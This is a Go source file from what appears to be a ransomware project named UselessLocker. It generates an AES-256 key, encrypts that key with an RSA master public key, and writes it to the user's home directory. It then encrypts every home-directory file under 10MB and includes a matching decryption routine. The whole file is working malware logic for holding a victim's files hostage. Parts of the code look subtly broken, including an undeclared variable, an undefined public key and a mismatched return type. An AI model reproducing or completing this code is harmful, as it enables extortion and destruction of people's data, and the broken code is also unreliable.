package useless

import (
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"

	"github.com/TheCreeper/UselessLocker/useless/crypto"
)

type Session struct{ key []byte }

// CreateSession will generate a new AES key and encrypt it using the provided
// RSA public key. The encrypted AES key is then written to a file within the
// users home directory.
func CreateSession() (session Session, err error) {
	u, err := user.Current()
	if err != nil {
		return
	}

	// Generate a key to use for this session
	key, err = crypto.GenerateKey(crypto.AES256)
	if err != nil {
		return
	}

	// Encrypt the generated aes key using the public key of the master
	// and write it out to the filesystem as soon as possible. We dont want
	// to encrypt files and lose the key.
	ekey, err := crypto.EncryptKey(pub, key)
	if err != nil {
		return
	}
	return key, ioutil.WriteFile(filepath.Join(u.HomeDir, PathEncryptedKey), ekey, 0750)
}

// EncryptHome will attempt to encrypt (using the provided key) all files in
// a users home directory that fit a specific criteria.
func EncryptHome(key []byte) (err error) {
	u, err := user.Current()
	if err != nil {
		return
	}

	// Get a list of files in the users home directory that are less
	// than 10MB
	files, err := GetFileList(u.HomeDir, 10485760)
	if err != nil {
		return
	}

	// Write out the file list to a file in the users home directory.
	if err = WriteFileList(u.HomeDir, files); err != nil {
		return
	}

	// Start encrypting each file in the list
	for _, file := range files {
		if err = crypto.EncryptFile(key, file); err != nil {
			return
		}
	}
	return
}

// DecryptHome will read the list of encrypted files and attempt to decrypt
// each one using the provided key.
func DecryptHome(key []byte) (err error) {
	u, err := user.Current()
	if err != nil {
		return
	}

	files, err := ReadFileList(u.HomeDir)
	if err != nil {
		return
	}
	for _, file := range files {
		// Check if file still exists otherwise skip it.
		if _, err := os.Stat(file); os.IsNotExist(err) {
			continue
		}

		if err = crypto.DecryptFile(key, file); err != nil {
			return
		}
	}
	return
}
